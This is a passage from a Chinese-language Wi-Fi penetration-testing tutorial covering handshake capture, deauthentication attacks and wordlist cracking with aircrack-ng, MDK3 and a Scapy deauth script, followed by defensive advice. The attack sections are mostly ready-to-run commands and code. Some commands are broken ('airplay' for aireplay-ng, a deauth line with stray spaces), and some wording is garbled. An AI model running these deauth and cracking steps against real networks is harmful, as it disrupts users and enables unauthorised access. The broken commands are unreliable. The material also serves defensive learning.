    # 密码更新


    - 建议您立即将网络密码更新为包含大写字母、小写字母、数字和特殊字符组合的强密码。


    ## 配置安全协议


    - 禁用 `WEP` 协议并将所有网络配置为 `WPA2` 或 `WPA3`。确保所有设备支持新的安全协议。


    ## 禁用 WPS


    - 禁用 `AP` 上的 `WPS`，以防止利用此漏洞的暴力破解。


    ## 持续监控


    - 实施持续监控解决方案以检测异常活动并快速响应潜在威胁。可以使用 `Wireshark` 和 `Kismet` 等工具定期监控网络。


    # 实际分析示例


    为了说明讨论的工具和技术如何在实践中应用，让我们分析一个数据包采集和漏洞识别的示例。


    ## 使用 Wireshark 进行数据包采集


    **开始采集**：打开 `Wireshark` 并选择网络接口开始采集。点击采集按钮开始监控流量。


    **应用过滤器**：使用过滤器关注特定的数据包。例如，仅过滤 DHCP 数据包：


    ```text

    dhcp

    ```


    **分析数据包**：检查捕获的数据包以识别相关信息。例如，分析 DHCP 数据包可以揭示连接到网络的新设备。


    ## 使用 Aircrack-ng 识别弱密码


    **采集认证数据包**：使用 `airodump-ng` 采集特定网络的数据包：


    ```bash

    sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon

    ```


    **执行取消认证攻击**：强制设备取消认证并捕获认证握手：


    ```bash

    sudo airplay --deauth 0 -a 00:11:22:33:44:55 -c 66:77:88:99:AA:BB wlan0mon

    ```


    **破解密码**：使用 `aircrack-ng` 结合捕获的文件尝试破解密码：


    ```bash

    sudo aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 capture-01.cap

    ```


    ## 使用 Kismet 进行漏洞分析


    1. **启动 Kismet**：打开 `Kismet` 并配置网络接口以开始检测网络。

    2. **监控网络**：`Kismet` 被动检测并监控网络，在不传输数据的情况下捕获数据包。扫描检测到的网络以识别安全配置和漏洞。

    3. **识别隐藏网络**：`Kismet` 可以发现不广播 `SSID` 的隐藏网络。这有助于识别未经授权或配置错误的访问点。


    分析 Wi-Fi 网络是网络安全专业人员的一项基本技能。通过使用 `Wireshark`、`Aircrack-ng`、`Kismet` 和 `Fern WiFi
    Cracker` 等工具可以采集并解释数据包，识别模式和漏洞，并生成详细报告以改进网络安全。这些技术的实际应用允许有效且深入的分析，为保护网络免受威胁和确保数据完整性提供了价值见解。


    # 第 4 章：取消认证攻击


    # 取消认证攻击的基础


    取消认证攻击是 Wi-Fi 网络上常用的一种技术，通过强制无线设备断开与访问点 (`AP`) 的连接。这些攻击利用了设备管理 Wi-Fi 连接的方式，可以作为更复杂攻击的初步步骤，例如捕获用于密码破解的
    `WPA/WPA2` 握手。


    ## 取消认证攻击的工作原理


    在取消认证攻击中，攻击者向 `AP` 或客户端发送伪造的取消认证数据包。这些数据包导致接收设备认为它已被指示断开网络连接。Wi-Fi 网络使用的 `802.11`
    协议对取消认证数据包不需要认证或加密，使得这些攻击执行起来相对简单。


    - **取消认证数据包**：这些数据包告诉设备断开网络。它们可以指向客户端（客户端取消认证）或指向 `AP`（AP 取消认证）。

    - **攻击目标**：目标范围从简单的停止服务、强制客户端重新连接（捕获握手），到为中间人攻击创建环境。


    ## 执行工具和方法


    有多种工具和方法可以执行取消认证。让我们探索一些最常用的，例如 `Aircrack-ng` 工具集中的 `airplay-ng`，以及如何在实践中使用它们。


    ### Aireplay-ng


    `airplay-ng` 是 `Aircrack-ng` 软件包中的一个工具，用于向 Wi-Fi 网络注入数据包。它可以用于执行取消认证攻击等其他类型的攻击。


    **安装**：


    ```bash

    sudo apt install aircrack-ng

    ```


    **监控模式**：首先，将网络接口设置为监控模式：


    ```bash

    sudo airmon-ng start wlan0

    ```


    **取消认证攻击**：使用 `airplay-ng` 执行取消认证攻击。以下命令将向特定客户端发送取消认证数据包：


    ```bash

    sudo aireplay-ng --deauth 0 -a [BSSID] -c [CLIENT_MAC] wlan0mon

    ```


    - `[BSSID]`：访问点的 MAC 地址。

    - `[CLIENT_MAC]`：客户端的 MAC 地址。


    要取消认证所有连接到 `AP` 的客户端，请使用以下命令：


    ```bash

    sudo airplay - deauth 0 - a [ BSSID ] wlan0mon

    ```


    ### MDK3


    `MDK3` 是另一个强大的 Wi-Fi 渗透测试工具，能够执行包括取消认证在多种攻击。


    **安装**：


    ```bash

    sudo apt install mdk3

    ```


    **取消认证攻击**：使用 `MDK3` 取消网络上所有客户端的认证：


    ```bash

    sudo mdk3 wlan0mon d -b blacklist.txt

    ```


    - `blacklist.txt`：包含你想要攻击的 `APs` 的 `BSSIDs` 的文件。


    ### Scapy


    `Scapy` 是 Python 中一个强大的数据包处理库。可创建自定义的取消认证脚本。


    **安装**：


    ```bash

    sudo apt install python3-scapy

    ```


    **取消认证脚本**：这是一个使用 `Scapy` 发送取消认证数据包的 Python 脚本示例：


    ```python

    from scapy.all import *


    interface = "wlan0mon"

    ap_mac = "00:11:22:33:44:55"

    client_mac = "66:77:88:99:AA:BB"

    dot11 = Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac)

    packet = RadioTap()/dot11/Dot11Deauth(reason=7)

    sendp(packet, iface=interface, count=100, inter=0.1)

    ```


    此脚本从 MAC 地址为 `00:11:22:33:44:55` 的 AP 向 MAC 地址为 `66:77:88:99:AA:BB` 的客户端发送 100
    个取消认证数据包。


    ## 缓解与防御


    由于 `802.11` 协议的开放性，保护 Wi-Fi 网络免受取消认证攻击具有挑战性。但有一些策略和最佳实践可以缓解此类攻击。


    ### 使用 WPA3


    `WPA3` 是最新版本的 Wi-Fi 安全协议，包含了多项改进，使取消认证攻击变得困难。


    - **SAE (等等身份认证)**：`WPA3` 在认证过程中使用 `SAE`，使得暴力破解变得变得困难得多。改进的加密也有助于防止取消认证攻击。


    ## 监控与检测


    实施监控系统可以帮助实时检测取消认证攻击。


    - **入侵检测系统 (IDS)**：如 `Snort` 或 `Zeek` 等工具可以配置为监控网络流量并在发现可疑取消认证数据包时告警。

    - **kismet**：`Kismet` 可用于检测取消认证活动。配置告警以便检测到取消认证数据包时通知你。


    ### 数据包过滤


    某些高级路由器和企业级 `APs` 提供包过滤功能，可以拦截伪造的取消认证数据包。


    - **MAC 过滤**：配置访问控制列表 (`ACLs`) 仅允许特定设备接入网络。

    - **深度包检测 (DPI)**：`DPI` 可用于检查和过滤伪造的取消认证数据包。


    ### 网络分


    划分网络可以限制取消认证攻击的影响。


    - **为不同设备划分网络**：为关键设备和通用设备配置独立的网络。这限制了攻击对网络某部分的影响。


